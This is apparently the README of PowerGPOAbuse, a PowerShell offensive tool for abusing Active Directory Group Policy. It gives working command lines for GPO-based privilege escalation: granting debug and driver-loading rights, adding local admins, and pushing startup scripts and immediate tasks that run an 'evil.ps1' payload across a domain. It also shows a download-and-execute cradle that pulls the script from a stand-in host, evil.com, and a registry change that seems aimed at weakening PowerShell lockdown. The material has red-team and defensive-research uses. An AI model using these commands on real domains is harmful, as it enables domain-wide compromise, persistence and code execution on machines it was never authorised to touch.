# PowerGPOAbuse
Powershell version of SharpGPOAbuse for those who can't compile or if their C2 can't execute .NET Assembly straightly from memory. Highly inspired by the [original](https://github.com/FSecureLABS/SharpGPOAbuse) C# version and the amazing [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1). 

Usage
=====================

Import the script
-----------------

* <code>PS> Import-Module .\PowerGPOAbuse.ps1</code>

* <code>PS> . .\PowerGPOAbuse.ps1</code>

* <code>PS> IEX (New-Object System.Net.WebClient).DownloadString('https://evil.com/PowerGPOAbuse.ps1')</code>

Recon
-----------------

* Those function are designed for exploitation function, but they can be used to quick recon. They not aim to replace PowerView's one.

* List users <code>PS> Get-DomainUser</code>

* List groups <code>PS> Get-DomainGroup</code>

* List GPOs <code>PS> Get-DomainGPO</code>

* List OUs <code>PS> Get-DomainOU</code>

* List DCs <code>PS> Find-DomainController</code>

Exploitation
-----------------

* Changing GPO status <code>PS> Set-DomainGPOStatus -GPOIdentity "SuperSecureGPO" -Status "AllSettingsDisabled"</code>

* Creating a new GPLink <code>PS> New-DomainGPLink -GPOIdentity "SuperSecureGPO" -OUIdentity "SecureUsers" -Status "LinkEnabled" </code>

* Changing the status of a GPLink <code>PS> New-DomainGPLink -GPOIdentity "SuperSecureGPO" -OUIdentity "SecureUsers" -Status "LinkEnabled"</code>

* Adding a user to a group <code>PS> Add-GPOGroupMember -Member 'Bobby' -GPOIdentity 'SuperSecureGPO'</code>

* Assign a new right <code>PS> Add-GPOUserRights -Rights "SeLoadDriverPrivilege","SeDebugPrivilege" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'</code>

* Adding a new Computer/User script <code>PS> Add-GPOStartupScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO' -Scope Computer/User</code>

* Create an new Computer/User immediate task <code>PS> Add-GPOImmediateTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments "'$(Get-Content evil.ps1)'" -Author Administrator -Scope Computer/User</code>

* Adding a new registry key <code> PS> Add-GPORegistryPreference -GPOIdentity SuperSecureGPO -RegistryPath "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\" -RegistryKey "__PSLockdownPolicy" -RegistryValue "4" -RegistryValueType String -RegistryAction Create</code>

* Create a new GPO <code>PS> New-DomainGPO -DisplayName SuperSecureGPO -Domain testlab.local</code>

* Delete a GPO <code>PS> Remove-DomainGPO -GPOIdentity SuperSecureGPO -RemoveFile</code>

Aliases
-----------------

* <code>Add-LocalAdmin</code> -> <code>Add-GPOGroupMember</code>

* <code>Add-UserRights</code> -> <code>AddGPOUserRights</code>

* <code>Add-Script</code> -> <code>Add-GPOStartupScript</code>

* <code>Add-Task</code> -> <code>Add-GPOImmediateTask</code>

* <code>Add-RegistryValue</code> -> <code>Add-GPORegistryPreference</code>

Future changes
=====================

Reverse functions, Backup Operator weaponization, stability, optimisation and new exploitation functions.

if you find any bugs, idea to improve the script, or any feedback, feel free raise an issue or propose a pull requests ! 
